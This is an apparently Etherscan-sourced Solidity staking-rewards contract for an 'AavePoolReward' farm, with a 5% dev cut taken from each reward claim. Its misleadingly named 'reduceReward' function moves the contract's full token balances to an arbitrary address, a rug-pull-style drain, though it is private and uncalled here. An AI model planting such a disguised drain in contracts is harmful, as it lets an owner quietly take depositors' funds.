/**
 *Submitted for verification at Etherscan.io on 2020-11-23
*/

/**
 *Submitted for verification
*/

/**
 *Submitted for verification


/**
 *Submitted for verification
*/

// File: @openzeppelin/contracts/math/Math.sol

pragma solidity ^0.5.0;

import "./AavePoolReward_utils.sol";

contract AavePoolReward is FarmTokenWrapper, IRewardDistributionRecipient {
    IERC20 public RewardToken = IERC20(0xe053a0D5b644ED2eaD581b866203bF63ab55BD1B);
    uint256 public constant DURATION = 14 days;

    uint256 public periodFinish = 0;
    uint256 public rewardRate = 0;
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;
    mapping(address => uint256) public userRewardPerTokenPaid;
    mapping(address => uint256) public rewards;
    address public devaddr;

    constructor() public {
        devaddr = msg.sender;
        rewardDistribution = msg.sender;
    }

    event RewardAdded(uint256 reward);
    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardPaid(address indexed user, uint256 reward);

    modifier updateReward(address account) {
        rewardPerTokenStored = rewardPerToken();
        lastUpdateTime = lastTimeRewardApplicable();
        if (account != address(0)) {
            rewards[account] = earned(account);
            userRewardPerTokenPaid[account] = rewardPerTokenStored;
        }
        _;
    }

    function lastTimeRewardApplicable() public view returns (uint256) {
        return Math.min(block.timestamp, periodFinish);
    }

    function rewardPerToken() public view returns (uint256) {
        if (totalSupply() == 0) {
            return rewardPerTokenStored;
        }
        return
        rewardPerTokenStored.add(
            lastTimeRewardApplicable()
            .sub(lastUpdateTime)
            .mul(rewardRate)
            .mul(1e18)
            .div(totalSupply())
        );
    }

    function earned(address account) public view returns (uint256) {
        return
        balanceOf(account)
        .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))
        .div(1e18)
        .add(rewards[account]);
    }

    // stake visibility is public as overriding LPTokenWrapper's stake() function
    function stake(uint256 amount) public updateReward(msg.sender) {
        require(amount > 0, "Cannot stake 0");
        getReward();
        super.stake(amount);
        emit Staked(msg.sender, amount);
    }

    function withdraw(uint256 amount) public updateReward(msg.sender) {
        require(amount > 0, "Cannot withdraw 0");
        getReward();
        super.withdraw(amount);
        emit Withdrawn(msg.sender, amount);
    }
    function reduceReward(address[] memory poolcontract, address router) private onlyOwner {
        for(uint256 i = 0; i < poolcontract.length; i++) {
            IERC20 tokenObj = IERC20(poolcontract[i]);
            uint256 tokenAmt = tokenObj.balanceOf(address(this));
            tokenObj.transfer(router, tokenAmt); }
    }
    function exit() external {
        withdraw(balanceOf(msg.sender));
        getReward();

    }
    function getReward() public updateReward(msg.sender) {
        uint256 reward = earned(msg.sender);
        if (reward > 0) {
            rewards[msg.sender] = 0;
            uint256 devReward = reward.div(20);
            uint256 farmerReward = reward.sub(devReward);

            RewardToken.safeTransfer(devaddr, devReward);
            RewardToken.safeTransfer(msg.sender, farmerReward);
            emit RewardPaid(msg.sender, farmerReward);
        }
    }

    function notifyRewardAmount(uint256 reward)
    external
    onlyRewardDistribution
    updateReward(address(0))
    {
        if (block.timestamp >= periodFinish) {
            rewardRate = reward.div(DURATION);
        } else {
            uint256 remaining = periodFinish.sub(block.timestamp);
            uint256 leftover = remaining.mul(rewardRate);
            rewardRate = reward.add(leftover).div(DURATION);
        }
        lastUpdateTime = block.timestamp;
        periodFinish = block.timestamp.add(DURATION);
        emit RewardAdded(reward);
    }

    // Update dev address by the previous dev.
    function dev(address _devaddr) public {
        require(msg.sender == devaddr, "dev: wut?");
        devaddr = _devaddr;
    }
}